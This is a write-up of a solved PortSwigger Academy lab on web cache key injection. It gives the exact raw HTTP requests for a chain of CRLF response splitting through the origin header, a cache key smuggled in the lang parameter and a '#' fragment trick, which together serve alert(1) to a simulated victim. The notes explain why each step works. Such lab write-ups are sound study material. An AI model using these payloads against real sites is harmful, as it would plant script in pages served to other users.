# Web Cache Poisoning Lab 12 — Cache key injection — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Web Cache Poisoning
**Lab:** Cache key injection
**Difficulty:** Expert
**Solved:** 27 November 2026 ~07:55 PKT (banner verified: instance login page shows "Congratulations, you solved the lab!")
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0ae200d2039337c2801303bb00aa00f5.web-security-academy.net/ (fresh re-launch 27 Nov 07:30 PKT; no exploit server shown for this lab)
**Exploit server:** none (not needed — the attack uses the lab's own `/js/localize.js` endpoint)

## Vulnerability Type

Cache key injection chained with response header injection and client-side parameter pollution: (1) `/js/localize.js` reflects the `Origin` request header into `Access-Control-Allow-Origin` when `cors=1`, so a CRLF in `Origin` splits the response and the injected second response (`alert(1)`) can be cached; (2) the cache key is `URL$$Origin=<value>` (visible with `Pragma: x-get-cache-key`), and the `utm_content` parameter is stripped from the key by a flawed regex — so attacker-controlled text can be smuggled into the *key itself* through the URL; (3) the `/login` redirect reflects the `lang` parameter into the login page's `localize.js` import URL without URL-encoding it, so a crafted `lang` value controls the import URL the victim's browser requests.

## Solution

Two requests, replayed together every ~8 seconds (each cache entry lives ~35 s, `Cache-Control: max-age=35`):

**Request 1 — poison the localize.js entry.** Raw HTTP/1.1 request (lowercase `origin` header — the key component keeps the case it is sent with, and the victim's key uses lowercase `origin` from the URL):

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
Host: 0ae200d2039337c2801303bb00aa00f5.web-security-academy.net
origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

The server reflects the `origin` header into `Access-Control-Allow-Origin`, the `%0d%0a` decode to CRLF, and the response splits: the first response is `alert(1)` (8 bytes, `Content-Length: 8`). The cache stores it under the key `/js/localize.js?lang=en?cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$` (verified with `Pragma: x-get-cache-key`; a repeat request with the same `origin` returns `alert(1)` with `X-Cache: hit`).

**Request 2 — poison the `/login?lang=en` redirect.** Raw request with the official solution's literal `$$` (they are part of the URL, not separators):

```
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
```

Its cache key is `/login?lang=en$$` (the `utm_content` value is stripped), so it overwrites the entry the victim looks up. The 302 `Location` is `/login/?lang=en?utm_content=x&cors=1&x=1$$origin=x%0d%0aContent-Length: 8%0d%0a%0d%0aalert(1)$$#` — the victim's browser follows it, the login page builds the import `/js/localize.js?lang=en?utm_content=x&cors=1&x=1$$origin=x%0d%0aContent-Length: 8%0d%0a%0d%0aalert(1)$$#&cors=0`, the `#` fragment strips the trailing `&cors=0`, and the browser requests `/js/localize.js?lang=en?utm_content=x&cors=1&x=1$$origin=x%0d%0aContent-Length: 8%0d%0a%0d%0aalert(1)$$`. That request's cache key is exactly the key request 1 poisoned — `X-Cache: hit`, body `alert(1)` — and the victim's browser executes `alert(1)` when the script loads. Banner verified on the instance login page.

Full solver: `~/workspace/scripts/ps-cache-poisoning.py` (Lab 12) plus the chain runner `~/workspace/wcp/lab12-victim-raw.py` / `~/workspace/wcp/lab12-loop.py` (replays request 1 + request 2 and polls the home page for the banner).

## Practical Explanation

- **Why the key has to be built by hand:** the cache key is `<url>$$origin=<value>`. The victim's import request never sends an `Origin` header, so its key ends with a bare `$$` — while a poisoned response is normally stored under a key that *includes* the injected `Origin`. The two keys can only match if the victim's URL itself contains `$$origin=<injected value>$$`, so that appending the empty `$$` separator reproduces the poisoned key exactly. That is what "cache key injection" means here: the URL smuggles the `Origin` component into the key.
- **Why the trailing `$$$$` in request 1:** the victim's key ends with the `$$` from the URL plus the `$$` separator (four `$` in total after `alert(1)`), so the `origin` header sent in request 1 must be `x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$` — the extra `$` characters fall into the discarded second response after the split (the first response is still exactly `alert(1)`, 8 bytes).
- **Why the `origin` header must be lowercase:** the key component keeps the case of the header as sent. The victim's key gets `origin=` (lowercase) from the URL parameter name, so request 1 must send a lowercase `origin` header too — a capital `Origin` would store the poison under `$$Origin=...`, a different key the victim never looks up. (HTTP/1.1 with a lowercase header name works; the hint about HTTP/2 is only about header case.)
- **Why the `#` matters:** the login page always appends `&cors=0` to the import URL, and the endpoint takes the *last* `cors` value — so without the `#`, the victim's import would have `cors=1` then `cors=0` and the injection would not fire. The `#` (from `%23` in the `lang` value, inserted raw into the import URL by the page) makes the browser drop `&cors=0` as a fragment, leaving `cors=1` effective.
- **Why the first solver run failed for 300 seconds:** the solver replaced the official solution's literal `$$` with `&` (`&origin=` as a separate parameter instead of `$$origin=` inside the `lang` value). Without the `$$`, the victim's import key never contained the injected `origin`, so it could never match the poisoned entry. The `$$` are the whole attack.
- **Why verification must use raw requests, not `requests`:** Python `requests` uppercases percent-encoding hex (`%0d` becomes `%0D`), and the cache key is case-sensitive — a victim simulation through `requests` looks up a different key and gets the normal response, even though a real Chrome (which preserves the lowercase `%0d` from the page) hits the poisoned entry. The same case rule applies to the `origin` header name.
- **Why the poison is a race:** both poisoned entries live only ~35 seconds, and any clean request to the same key after expiry re-caches the normal response. The solver replays both requests every ~8 seconds so the entries are poisoned whenever the victim visits (the victim visits the home page regularly).

## Lessons Learned

- A cache key is just a string — if you can control part of it through the URL, you can make the victim's lookup land on an entry you poisoned, even when the victim sends none of the headers the poison needed.
- When an official solution uses odd-looking characters (`$$`), do not "fix" them: they are usually load-bearing. The solver's `&`-for-`$$` substitution silently broke the entire chain.
- Percent-encoding case matters for cache keys (`%0d` ≠ `%0D`); test with the exact bytes the victim's browser will send, not with a library that normalises them.
- Header-name case matters for cache keys too (`$$origin=` ≠ `$$Origin=`).
- A response-splitting payload's `Content-Length` must match the *first* response's body exactly; extra bytes after it are harmless because they fall into the discarded second response — and here they were required to complete the key.
- The `#` fragment trick is a clean way to delete a trailing parameter the page appends to a URL you control through parameter pollution.
